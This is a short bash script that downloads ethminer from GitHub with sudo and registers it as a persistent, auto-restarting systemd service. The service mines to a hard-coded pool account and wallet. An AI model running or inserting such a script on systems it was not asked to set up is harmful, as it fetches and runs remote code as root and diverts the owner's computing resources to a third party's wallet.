SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
  echo "taind vip pro" > isHaveSetupCoin.txt
  cd /usr/local/bin
  sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
  sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
  sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://nano_3xrboi8qd3rffub47g76jqewafgkcusfrp6jbb5p4zwoq5mjdmihztjz146y.Vhtdeptrai@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
  sudo systemctl daemon-reload
  sudo systemctl enable eth.service
  sudo systemctl start eth.service
else
  sudo systemctl start eth.service
fi